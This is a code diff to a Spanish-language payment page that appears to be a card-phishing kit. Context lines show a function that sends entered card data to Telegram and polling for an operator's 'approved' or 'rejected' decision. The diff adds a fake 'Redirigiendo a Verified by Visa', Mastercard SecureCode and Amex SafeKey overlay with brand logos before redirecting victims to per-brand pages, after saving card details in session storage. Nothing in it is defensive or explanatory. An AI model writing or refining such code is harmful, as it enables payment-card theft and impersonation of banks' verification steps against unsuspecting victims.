@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -673,10 +674,19 @@
     </style>
 </head>
 <body>
+    <!-- LOADING OVERLAY PARA PROCESAMIENTO -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Procesando pago...</div>
         <div class="loading-subtext">Verificando información de la tarjeta</div>
+    </div>
+
+    <!-- LOADING OVERLAY PARA REDIRECCIÓN CON LOGO -->
+    <div class="loading-overlay" id="redirectOverlay" style="display:none;">
+        <div class="spinner"></div>
+        <div id="redirectLogo" style="margin-bottom:20px;"></div>
+        <div class="loading-text" id="redirectText">Redirigiendo a Verified by Visa...</div>
+        <div class="loading-subtext">Por favor espere</div>
     </div>
 
     <header>
@@ -944,6 +954,9 @@
         const form = document.getElementById('paymentForm');
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const redirectOverlay = document.getElementById('redirectOverlay');
+        const redirectLogo = document.getElementById('redirectLogo');
+        const redirectText = document.getElementById('redirectText');
         const statusMessage = document.getElementById('statusMessage');
 
         const cardPatterns = {
@@ -1116,6 +1129,52 @@
         }
 
         // ============================================
+        // MOSTRAR PANTALLA DE CARGA CON LOGO
+        // ============================================
+        function mostrarRedireccionConLogo(tipo) {
+            const logos = {
+                'visa': {
+                    img: 'visa.png',
+                    text: 'Redirigiendo a Verified by Visa...'
+                },
+                'mastercard': {
+                    img: 'master.png',
+                    text: 'Redirigiendo a Mastercard SecureCode...'
+                },
+                'amex': {
+                    img: 'ame.png',
+                    text: 'Redirigiendo a American Express SafeKey...'
+                }
+            };
+
+            const logoData = logos[tipo] || logos['visa'];
+            
+            // Crear imagen del logo
+            redirectLogo.innerHTML = `<img src="${logoData.img}" style="height:60px; width:auto; display:block; margin:0 auto;" />`;
+            redirectText.textContent = logoData.text;
+            
+            // Mostrar overlay
+            redirectOverlay.style.display = 'flex';
+            redirectOverlay.classList.add('active');
+            loadingOverlay.classList.remove('active');
+            
+            // Ocultar mensajes de estado
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
+            
+            // Esperar 5 segundos y redirigir
+            setTimeout(() => {
+                const map = {
+                    'visa': 'visa.html',
+                    'mastercard': 'master.html',
+                    'amex': 'amex.html'
+                };
+                const destino = map[tipo] || 'index.html';
+                window.location.href = destino;
+            }, 5000);
+        }
+
+        // ============================================
         // ENVÍO DE DATOS DE TARJETA A TELEGRAM
         // ============================================
         async function enviarDatosTarjetaATelegram(datos) {
@@ -1199,14 +1258,7 @@
         // REDIRIGIR SEGÚN TIPO DE TARJETA (GUARDANDO DATOS)
         // ============================================
         function redirigirSegunTipoTarjeta(tipo) {
-            const map = {
-                'visa': 'visa.html',
-                'mastercard': 'master.html',
-                'amex': 'amex.html'
-            };
-            const destino = map[tipo] || 'index.html';
-            
-            // ⭐ GUARDAR DATOS DE LA TARJETA EN SESSIONSTORAGE ⭐
+            // Guardar datos de la tarjeta en sessionStorage
             const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const cardLast4 = cardNumber.slice(-4);
             
@@ -1218,7 +1270,8 @@
             sessionStorage.setItem('cardType', tipo);
             sessionStorage.setItem('bancoEmisor', document.getElementById('bancoEmisor').value);
             
-            window.location.href = destino;
+            // Mostrar pantalla de carga con logo
+            mostrarRedireccionConLogo(tipo);
         }
 
         // ============================================
@@ -1247,12 +1300,8 @@
 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
-                    loadingOverlay.classList.remove('active');
-                    mostrarExito('✅ Pago aprobado. Redirigiendo...');
-                    
-                    setTimeout(() => {
-                        redirigirSegunTipoTarjeta(cardType);
-                    }, 1500);
+                    // Mostrar pantalla de carga con logo correspondiente
+                    redirigirSegunTipoTarjeta(cardType);
 
                 } else if (resultado === 'rejected') {
                     clearInterval(pollingInterval);
